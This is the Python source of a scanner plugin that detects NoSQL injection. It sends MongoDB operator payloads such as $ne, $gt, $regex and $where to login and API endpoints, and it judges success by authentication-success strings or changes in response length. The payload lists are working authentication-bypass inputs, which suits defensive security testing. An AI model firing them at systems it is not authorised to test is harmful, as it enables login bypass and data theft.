"""
Plugin 1177: NoSQL Injection Detection
========================================
Detects NoSQL injection vulnerabilities in MongoDB and similar
databases by injecting $ne, $gt, $regex, and other NoSQL operators
into JSON/URL parameters.
"""
import asyncio
import json
import ssl
import urllib.parse

from plugins import NaslPlugin, PluginResult


class NosqliDetection(NaslPlugin):
    PLUGIN_ID = 1177
    NAME = 'NoSQL Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 9.1
    DESCRIPTION = (
        'Detects NoSQL injection vulnerabilities in MongoDB and similar '
        'databases by injecting $ne, $gt, $regex, and other NoSQL operators '
        'into JSON/URL parameters. NoSQL injection can bypass authentication '
        'and extract data without proper authorization.'
    )
    SOLUTION = (
        'Validate and sanitize all user input before passing to NoSQL queries. '
        'Use schema validation. Avoid $where operator. Use an ORM/ODM.'
    )
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    NOSQL_PAYLOADS = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$in": ["admin", "true"]}',
        '{"$where": "1==1"}',
        '{"$gte": ""}',
        '{"$lte": ""}',
    ]

    URL_PAYLOADS = [
        '[$ne]=null',
        '[$gt]=',
        '[$regex]=.*',
        '[$exists]=true',
        '[$ne]=',
    ]

    PARAMS = [
        'username', 'password', 'email', 'user', 'name',
        'id', 'token', 'session', 'auth', 'role',
    ]

    PATHS = [
        '/', '/api/login', '/api/auth', '/api/user', '/login',
        '/api/register', '/api/search', '/api/items',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for payload in self.NOSQL_PAYLOADS:
                    for param in self.PARAMS[:5]:
                        for path in self.PATHS[:4]:
                            try:
                                body_text = await self._try_json_post(
                                    target, port_to_check, ctx, host_header, path, param, payload
                                )
                                if body_text and self._detect_nosql_success(body_text, payload):
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='critical',
                                        description=(
                                            f'NoSQL injection detected via param "{param}" on {path} '
                                            f'with operator payload'
                                        ),
                                        solution=self.SOLUTION,
                                        evidence=f'Parameter: {param}, path: {path}, payload: {payload}',
                                        references=[
                                            'https://portswigger.net/web-security/nosql-injection',
                                            'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_NoSQL_Injection',
                                        ]
                                    ))
                                    break
                            except Exception:
                                pass
                        if results:
                            break
                    if results:
                        break

                if not results:
                    for url_payload in self.URL_PAYLOADS:
                        for param in self.PARAMS[:5]:
                            for path in self.PATHS[:4]:
                                try:
                                    baseline_body = await self._fetch_body(
                                        target, port_to_check, ctx, host_header, path
                                    )
                                    injected_body = await self._fetch_body(
                                        target, port_to_check, ctx, host_header,
                                        f'{path}?{param}{url_payload}'
                                    )
                                    if baseline_body and injected_body:
                                        if len(injected_body) != len(baseline_body):
                                            results.append(PluginResult(
                                                vulnerable=True,
                                                target=target,
                                                port=port_to_check,
                                                cvss_score=self.CVSS_SCORE,
                                                severity='critical',
                                                description=(
                                                    f'NoSQL injection detected via URL param '
                                                    f'"{param}" on {path} with operator'
                                                ),
                                                solution=self.SOLUTION,
                                                evidence=f'Parameter: {param}, path: {path}, URL payload: {url_payload}',
                                                references=[
                                                    'https://portswigger.net/web-security/nosql-injection',
                                                    'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_NoSQL_Injection',
                                                ]
                                            ))
                                            break
                                except Exception:
                                    pass
                            if results:
                                break
                        if results:
                            break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No NoSQL injection indicators detected on checked ports'
            ))

        return results

    def _detect_nosql_success(self, body_text: str, payload: str) -> bool:
        indicators = ['"login":true', '"success":true', '"token"', '"authenticated"', '"valid":true']
        for ind in indicators:
            if ind in body_text:
                return True
        return False

    async def _try_json_post(self, target: str, port: int, ctx, host_header: str,
                             path: str, param: str, payload: str) -> str | None:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port, ssl=ctx), timeout=5
            )
            json_body = json.dumps({param: json.loads(payload)})
            req = (
                f'POST {path} HTTP/1.1\r\n'
                f'Host: {host_header}\r\n'
                f'User-Agent: Centra/1.0\r\n'
                f'Content-Type: application/json\r\n'
                f'Content-Length: {len(json_body)}\r\n'
                f'Connection: close\r\n\r\n{json_body}'
            )
            writer.write(req.encode())
            await writer.drain()
            response = b''
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                if not chunk:
                    break
                response += chunk
                if len(response) > 16384:
                    break
            writer.close()
            await writer.wait_closed()
            body = response.split(b'\r\n\r\n', 1)
            return body[1].decode('utf-8', errors='ignore') if len(body) > 1 else None
        except Exception:
            return None

    async def _fetch_body(self, target: str, port: int, ctx, host_header: str, full_path: str) -> str | None:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port, ssl=ctx), timeout=5
            )
            req = (
                f'GET {full_path} HTTP/1.1\r\n'
                f'Host: {host_header}\r\n'
                f'User-Agent: Centra/1.0\r\n'
                f'Connection: close\r\n\r\n'
            )
            writer.write(req.encode())
            await writer.drain()
            response = b''
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                if not chunk:
                    break
                response += chunk
                if len(response) > 16384:
                    break
            writer.close()
            await writer.wait_closed()
            body = response.split(b'\r\n\r\n', 1)
            return body[1].decode('utf-8', errors='ignore') if len(body) > 1 else None
        except Exception:
            return None
